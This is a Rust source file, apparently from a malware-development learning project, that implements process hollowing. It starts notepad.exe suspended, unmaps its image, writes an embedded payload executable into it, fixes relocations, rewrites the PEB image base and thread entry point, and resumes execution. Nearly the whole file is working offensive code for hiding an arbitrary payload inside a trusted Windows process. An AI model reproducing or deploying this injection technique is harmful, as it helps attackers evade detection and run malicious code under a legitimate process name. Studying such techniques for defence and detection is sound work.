use std::ffi::c_void;
use std::mem;
use windows::Win32::Foundation::GetLastError;
use windows::Win32::System::Diagnostics::Debug::{
    CONTEXT, CONTEXT_FULL_AMD64, GetThreadContext, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, ReadProcessMemory, SetThreadContext, WriteProcessMemory,
};
use windows::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_BASE_RELOCATION};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
};
use windows::Win32::System::Threading::{
    CreateProcessA, CREATE_SUSPENDED, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA, INFINITE, WaitForSingleObject,
};
use windows::core::{PCSTR, PSTR};
use ntapi::ntpsapi::{
    NtQueryInformationProcess, PROCESS_BASIC_INFORMATION,
};
use ntapi::ntmmapi::NtUnmapViewOfSection;

// Build hollow-payload first, THEN build this crate:
//   cargo build --target x86_64-pc-windows-gnu -p hollow-payload
//   cargo build --target x86_64-pc-windows-gnu -p process-hollowing
const PAYLOAD: &[u8] = include_bytes!(
    "/home/lucas/HPI/projects/maldev/getting-started/target/x86_64-pc-windows-gnu/release/hollow-payload.exe"
);

fn main() {
    unsafe {
        let si = STARTUPINFOA {
            cb: mem::size_of::<STARTUPINFOA>() as u32,
            ..Default::default()
        };
        let mut pi = PROCESS_INFORMATION::default();

        CreateProcessA(
            PCSTR(b"C:\\Windows\\System32\\notepad.exe\0".as_ptr()),
            PSTR::null(),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &si,
            &mut pi,
        ).expect("CreateProcessA failed");

        let mut pbi: PROCESS_BASIC_INFORMATION = mem::zeroed();
        let status: i32 = NtQueryInformationProcess(
            pi.hProcess.0 as *mut _,
            0,
            &mut pbi as *mut _ as *mut _,
            mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            std::ptr::null_mut(),
        );
        assert_eq!(status, 0, "NtQueryInformationProcess failed: {:#x}", status);
        let peb_base = pbi.PebBaseAddress as usize;

        let mut remote_image_base: usize = 0;
        ReadProcessMemory(
            pi.hProcess,
            (peb_base + 0x10) as *const c_void,
            &mut remote_image_base as *mut _ as *mut _,
            8,
            None,
        ).expect("ReadProcessMemory (PEB) failed");

        let status: i32 = NtUnmapViewOfSection(
            pi.hProcess.0 as *mut _,
            remote_image_base as _,
        );
        assert_eq!(status, 0, "NtUnmapViewOfSection failed: {:#x}", status);

        let dos: *const IMAGE_DOS_HEADER = PAYLOAD.as_ptr() as *const IMAGE_DOS_HEADER;
        let nt: *const IMAGE_NT_HEADERS64 = (PAYLOAD.as_ptr() as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        let preferred_base = (*nt).OptionalHeader.ImageBase;
        let image_size    = (*nt).OptionalHeader.SizeOfImage;
        let header_size   = (*nt).OptionalHeader.SizeOfHeaders;
        let entry_rva     = (*nt).OptionalHeader.AddressOfEntryPoint;
        let num_sections  = (*nt).FileHeader.NumberOfSections;
        let data_directory = (*nt).OptionalHeader.DataDirectory[5];

        let new_base: *mut c_void = VirtualAllocEx(
            pi.hProcess,
            Some(preferred_base as *const c_void),
            image_size as _,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if new_base.is_null() {
            panic!("VirtualAllocEx failed: {:?}", GetLastError());
        }

        WriteProcessMemory(
            pi.hProcess,
            new_base,
            PAYLOAD.as_ptr() as *const c_void,
            header_size as usize,
            None,
        ).expect("WriteProcessMemory (headers) failed");

        let sections_base = nt as usize + mem::size_of::<IMAGE_NT_HEADERS64>();
        for i in 0..num_sections {
            let section = &*((sections_base + i as usize * mem::size_of::<IMAGE_SECTION_HEADER>()) as *const IMAGE_SECTION_HEADER);
            WriteProcessMemory(
                pi.hProcess,
                (new_base as usize + section.VirtualAddress as usize) as *const c_void,
                (PAYLOAD.as_ptr() as usize + section.PointerToRawData as usize) as *const c_void,
                section.SizeOfRawData as usize,
                None,
            ).expect("WriteProcessMemory (section) failed");
        }

        if (new_base as usize) != (preferred_base as usize) {
            let delta = new_base as isize - preferred_base as isize;
            let mut block = (PAYLOAD.as_ptr() as usize + data_directory.VirtualAddress as usize) as *mut IMAGE_BASE_RELOCATION;
            let end = PAYLOAD.as_ptr() as usize + data_directory.VirtualAddress as usize + data_directory.Size as usize;

            while (block as usize) < end {
                let block_va = (*block).VirtualAddress as usize;
                let block_size = (*block).SizeOfBlock as usize;
                let entry_count = (block_size - mem::size_of::<IMAGE_BASE_RELOCATION>()) / 2;
                let entries = (block as usize + mem::size_of::<IMAGE_BASE_RELOCATION>()) as *mut u16;

                for i in 0..entry_count {
                    let entry = *entries.add(i);
                    let typ = entry >> 12;
                    let offset = (entry & 0x0FFF) as usize;
                    if typ == 0xA {
                        let patch_addr = (new_base as usize + block_va + offset) as *const c_void;
                        let mut value: usize = 0;
                        ReadProcessMemory(pi.hProcess, patch_addr, &mut value as *mut _ as *mut c_void, 8, None).unwrap();
                        value = (value as isize + delta) as usize;
                        WriteProcessMemory(pi.hProcess, patch_addr, &value as *const _ as *const c_void, 8, None).unwrap();
                    }
                }

                block = (block as usize + block_size) as *mut IMAGE_BASE_RELOCATION;
            }
        }

        WriteProcessMemory(
            pi.hProcess,
            (peb_base + 0x10) as *const c_void,
            &new_base as *const _ as *const _,
            8,
            None,
        ).expect("WriteProcessMemory (PEB update) failed");

        let mut ctx = CONTEXT { ContextFlags: CONTEXT_FULL_AMD64, ..Default::default() };
        GetThreadContext(pi.hThread, &mut ctx).expect("GetThreadContext failed");
        ctx.Rcx = new_base as u64 + entry_rva as u64;
        SetThreadContext(pi.hThread, &mut ctx).expect("SetThreadContext failed");
        ResumeThread(pi.hThread);

        WaitForSingleObject(pi.hProcess, INFINITE);
    }
}
